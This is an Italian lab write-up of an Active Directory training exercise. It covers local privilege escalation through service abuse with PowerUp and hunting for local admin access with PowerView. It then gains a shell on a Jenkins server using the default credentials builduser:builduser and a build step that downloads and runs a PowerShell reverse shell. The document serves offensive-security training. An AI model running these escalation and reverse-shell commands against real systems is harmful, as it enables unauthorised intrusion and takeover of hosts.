# LEARNING OBJECTIVE5

<figure><img src="../.gitbook/assets/Schermata da 2025-11-26 14-43-31.png" alt=""><figcaption></figcaption></figure>

1. Exploita un servizio su dcorp-studentx e eleva i privliegi ad amminstratore locale
2. Identifica un host nel dominio dove lo studentex ha accesso amministrativo locale
3. Utilizzando i privilegi dell'utente del servizio Jenkins su 172.16.3.11:8080, ottenere i privilegi su 172.16.3.11, il dcorp-ci server

#### 1.Exploit servizio su studentVM (dcorp-std178)

```powershell
. C:\AD\Tools\PowerUp.ps1 (Importiamo PowerUp)
Invoke-AllChecks (Eseguiamo la funzion che esegue check per LPE)
```

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Alternativamente si puo' usare PrivEscCheck

```powershell
. C:\AD\Tools\PrivEscCheck.ps1
Invoke-PrivEscCheck
```

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Anche winPeas64.exe

```powershell
./wimPEAS64.exe
```

<figure><img src="../.gitbook/assets/Schermata da 2025-12-18 12-15-36.png" alt=""><figcaption></figcaption></figure>

Infine per exploitare il servizio, eseguiamo

```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student178
```

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 2.Ricerca Accesso Amministrativo Locale per student178

```powershell
 . C:\AD\Tools\PowerView.ps1
 Find-LocalAdminAccess -Verbose
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Alternativamente si possono usare&#x20;

```powershell
 . C:\AD\Tools\Find-WMILocalAdminAccess.ps1
  Find-WMILocalAdminAccess
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Oppure

```powershell
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
  Find-PSRemotingLocalAdminAccess
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

L'utente ha accesso amministrativo su&#x20;

<kbd>dcorp-adminsrv.dollarcorp.moneycorp.local</kbd>&#x20;

#### Utilizzando i privilegi dell'utente del servizio Jenkins su 172.16.3.11:8080, ottenere i privilegi su 172.16.3.11, il dcorp-ci server

Navigare su 172.16.3.11:8080 ed eseguire il login usando le default credentials <kbd>builduser:builduser</kbd>

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Selezionare un progetto dalla liste e modificarlo

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cliccare su <kbd>Configure</kbd> e poi selezionare <kbd>Execute Windows Batch Command</kbd> nel menu <kbd>Add build step</kbd> inserendo il seguente payload:

```
powershell iex(iwr http://172.16.100.178/Zainetti.ps1);Power -Reverse -IPAddress 172.16.100.178 -Port 443
```

prerequisiti:

* Host Invoke-PowerShellTcp con hfs (io l ho chiamato Zainetti)
* Aggiungi eccezione firewall sulla student vm (172.16.100.178) oppure disattivalo completamente, siamo gia' admin grazie all'abuso locale su AbyssServer.
* Attiva listener netcat su student vm

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ESECUZIONE REVSHEL VIA JENKINS GUI E RELATIVO ACCESSO SU dcorp-ci.dollarcorp.moneycorp.local

Clicchiamo su <kbd>Build Now</kbd> nella GUI di Jenkins e BOOM!

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
